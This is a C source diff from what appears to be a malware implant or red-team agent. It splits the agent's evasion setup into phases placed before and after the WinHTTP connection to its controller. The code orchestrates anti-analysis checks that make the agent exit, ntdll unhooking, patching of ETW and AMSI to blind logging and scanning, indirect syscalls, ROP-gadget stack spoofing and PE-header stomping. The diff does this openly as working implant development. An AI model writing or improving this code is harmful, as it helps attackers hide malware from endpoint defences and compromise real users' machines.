@@ -513,8 +513,29 @@ static void _elog(const char *msg, DWORD len) {
 #define ELOG(s) ((void)0)
 #endif
 
-BOOL evasion_init(void) {
-    ELOG("[evasion] enter\r\n");
+/*
+ * Split evasion into two phases so WinHTTP can initialize cleanly.
+ *
+ * WinHTTP (WinHttpOpen) uses ETW internally and relies on ntdll stubs
+ * during its lazy init (thread pool, TLS context, provider registration).
+ * Patching ETW / unhooking ntdll BEFORE WinHttpOpen breaks WinHTTP the
+ * same way the stub-loader evasion broke it — the session handle works
+ * but WinHttpSendRequest hangs or fails.
+ *
+ * Phase 1 — PRE-CONNECT (before channel_init_active / WinHttpOpen):
+ *   anti_analysis_check  — safe, just reads system info
+ *   stack_spoof init     — safe, just caches gadget addresses
+ *
+ * Phase 2 — POST-CONNECT (after WinHttpOpen has a valid session handle):
+ *   unhook_ntdll   — restores clean ntdll .text from disk
+ *   patch_etw      — kills EtwEventWrite
+ *   patch_amsi     — kills AmsiScanBuffer
+ *   indirect_syscalls — resolves SSNs from (now-clean) ntdll
+ *   pe_stomp       — LAST, after all PE-header-reading init
+ */
+
+BOOL evasion_init_pre_connect(void) {
+    ELOG("[evasion] pre-connect enter\r\n");
 
     /* Load-time: anti-analysis (exits agent if detected) */
     if (!anti_analysis_check()) {
@@ -525,13 +546,26 @@ BOOL evasion_init(void) {
     PROBE("anti_analysis");
     ELOG("[evasion] anti_analysis OK\r\n");
 
+    /* Stack spoof is safe before WinHTTP — just caches ROP gadgets */
+#if CONFIG_STACK_SPOOF
+    spoof_init();
+    PROBE("stack_spoof");
+    ELOG("[evasion] spoof done\r\n");
+#endif
+
+    ELOG("[evasion] pre-connect OK\r\n");
+    return TRUE;
+}
+
+BOOL evasion_init_post_connect(void) {
+    ELOG("[evasion] post-connect enter\r\n");
+
     /* Run-time patches — order matters:
      * 1. Unhook ntdll FIRST (restores clean syscalls for everything else)
      * 2. Patch ETW (prevent logging of subsequent operations)
      * 3. Patch AMSI (prevent scanning of loaded assemblies)
      * 4. Initialize indirect syscalls (after unhook for clean stubs)
-     * 5. Initialize stack spoofing gadget cache
-     * 6. Stomp PE headers LAST (after all PE-reading init is done)
+     * 5. Stomp PE headers LAST (after all PE-reading init is done)
      */
 #if CONFIG_UNHOOK_NTDLL
     evasion_unhook_ntdll();
@@ -560,12 +594,6 @@ BOOL evasion_init(void) {
     ELOG("[evasion] syscalls done\r\n");
 #endif
 
-#if CONFIG_STACK_SPOOF
-    spoof_init();
-    PROBE("stack_spoof");
-    ELOG("[evasion] spoof done\r\n");
-#endif
-
     /* PE stomp must be LAST — after all code that reads PE headers */
 #if CONFIG_PE_STOMP
     evasion_stomp_pe_headers();
@@ -573,7 +601,13 @@ BOOL evasion_init(void) {
     ELOG("[evasion] stomp done\r\n");
 #endif
 
-    ELOG("[evasion] complete OK\r\n");
-
+    ELOG("[evasion] post-connect OK\r\n");
     return TRUE;
+}
+
+/* Legacy wrapper — calls both phases back-to-back (no WinHTTP in between).
+ * Kept for any code path that doesn't use the split API. */
+BOOL evasion_init(void) {
+    if (!evasion_init_pre_connect()) return FALSE;
+    return evasion_init_post_connect();
 }
